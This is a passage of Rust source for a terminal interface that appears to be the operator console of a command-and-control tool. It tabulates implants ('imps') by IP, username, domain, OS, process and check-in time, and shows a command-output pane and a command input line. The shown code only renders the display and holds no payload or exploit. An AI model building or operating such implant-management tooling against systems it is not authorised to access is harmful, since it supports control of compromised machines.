            .style(Style::default().bg(Color::Black).fg(Color::White))
            .title("Imp Info");

        //really, all the time comparison should be done on the server side and a special value returned as part of imp.info, but this is a quick and dirty way to do it.
        //TODO - fix this

        //trying to make fields scrollable

        let imp_info: Vec<_> = imp_info
            .iter()
            .map(|info| {
                // Parse sleep_value as a u64 number of seconds.
                let sleep_value_as_duration =
                    std::time::Duration::from_secs(info.sleep.parse::<u64>().unwrap_or(0));

                //print sleep_value_as_duration for debugging
                //println!("sleep_value_as_duration: {:?}", sleep_value_as_duration);
                //println!("info.sleep.parse: {:?}", info.sleep.parse::<u64>().unwrap_or(0));

                //parse session value and trim to 8 chars
                let session_value: String = info.session.clone();
                //let token = &token[..8];
                //let session_value = (&session_value[..8]).to_string();
                //trim session_value to last 8 chars
                let session_value = session_value
                    .chars()
                    .rev()
                    .take(8)
                    .collect::<String>()
                    .chars()
                    .rev()
                    .collect::<String>();

                // Parse last_check_in_time as a DateTime<Utc>.
                let last_check_in_time =
                    NaiveDateTime::parse_from_str(&info.last_check_in, "%Y-%m-%d %H:%M:%S")
                        .map(|naive| DateTime::from_naive_utc_and_offset(naive, Utc))
                        .unwrap_or_else(|_| Utc::now());

                // Calculate the time difference between the current time and the last check in time.
                let time_difference = Utc::now().signed_duration_since(last_check_in_time);
                //print time_difference for debugging
                //println!("time_difference: {:?}", time_difference);

                // If the time difference is greater than the sleep value plus 3, color red, else white.
                //something is wrong with the time difference calculation. it is not returning the correct value
                //it is returning a value of around 19-21 seconds when the sleep value is 3 seconds
                //this is causing the color to be red when it should be white
                //TODO - fix this
                //for now, we will increase the added value to 60 seconds to see if it fixes the issue
                let color = if time_difference
                    > chrono::Duration::from_std(sleep_value_as_duration).unwrap()
                        + chrono::Duration::seconds(60)
                {
                    Color::Red
                } else {
                    Color::White
                };

                Row::new(vec![
                    //Cell::from(Span::styled(info.session.clone(), Style::default().fg(color))),
                    Cell::from(Span::styled(
                        session_value.clone(),
                        Style::default().fg(color),
                    )),
                    Cell::from(Span::styled(info.ip.clone(), Style::default().fg(color))),
                    Cell::from(Span::styled(
                        info.username.clone(),
                        if info.username.contains('*') {
                            Style::default().fg(Color::Rgb(255, 165, 0)) // Orange color
                        } else {
                            Style::default().fg(color)
                        },
                    )),
                    Cell::from(Span::styled(
                        info.domain.clone(),
                        Style::default().fg(color),
                    )),
                    Cell::from(Span::styled(info.os.clone(), Style::default().fg(color))),
                    Cell::from(Span::styled(
                        info.imp_pid.clone(),
                        Style::default().fg(color),
                    )),
                    Cell::from(Span::styled(
                        info.process_name.clone(),
                        Style::default().fg(color),
                    )),
                    Cell::from(Span::styled(info.sleep.clone(), Style::default().fg(color))),
                    Cell::from(Span::styled(
                        info.last_check_in.clone(),
                        Style::default().fg(color),
                    )),
                ])
            })
            .collect();

        let start = app.imp_scroll_position;
        let end = std::cmp::min(start + app.max_displayed_items, imp_info.len());

        let visible_imp_info: Vec<_> = (start..end).map(|index| imp_info[index].clone()).collect();
        /* This is the original code
        let visible_imp_info: Vec<_> = imp_info[app.imp_scroll_position..]
            .iter()
            .take(app.max_displayed_items)
            .cloned()
            .collect();
        */

        let imp_table = Table::new(visible_imp_info)
            .header(
                Row::new(vec![
                    "Session",
                    "IP",
                    "Username",
                    "Domain",
                    "OS",
                    "Imp PID",
                    "Process Name",
                    "Sleep",
                    "Last Check In",
                ])
                .style(Style::default().fg(Color::White)),
            )
            .block(block)
            .widths(&[
                Constraint::Percentage(8), // was 21, reducing
                Constraint::Percentage(11),
                Constraint::Percentage(15),
                Constraint::Percentage(10),
                Constraint::Percentage(13),
                Constraint::Percentage(8),
                Constraint::Percentage(12),
                Constraint::Percentage(5), // Added extra 1% to cover rounding
                Constraint::Percentage(20), // Added extra 1% to cover rounding
            ]);

        f.render_widget(imp_table, chunks[1]);

        // Output box
        let output_block = Block::default().title("Output").borders(Borders::ALL);

        let start = app.output_scroll_position;
        let end = std::cmp::min(
            start + app.max_displayed_output_lines,
            app.command_output.len(),
        );

        let visible_output_lines: Vec<_> = (start..end)
            .map(|index| app.command_output[index].clone())
            .collect();

        let output_para_string = visible_output_lines
            .iter()
            .fold(String::new(), |acc, line| acc + line + "\n");
        let output_paragraph = Paragraph::new(output_para_string.as_ref())
            .block(output_block)
            .wrap(Wrap { trim: true });
        f.render_widget(output_paragraph, chunks[2]);

        // Command line input area
        let command_input_height = if chunks[3].height >= 3 {
            chunks[3].height
        } else {
            3
        };
        let command_chunk = Rect {
            x: chunks[3].x,
            y: chunks[3].y + chunks[3].height - command_input_height,
            width: chunks[3].width,
            height: command_input_height,
        };

        // Now use command_chunk in rendering the command input
        let command_input = Paragraph::new(app.command_text.as_str())
            .style(Style::default())
            .block(Block::default().title("Command Line").borders(Borders::ALL));
        f.render_widget(command_input, command_chunk);
    }
}
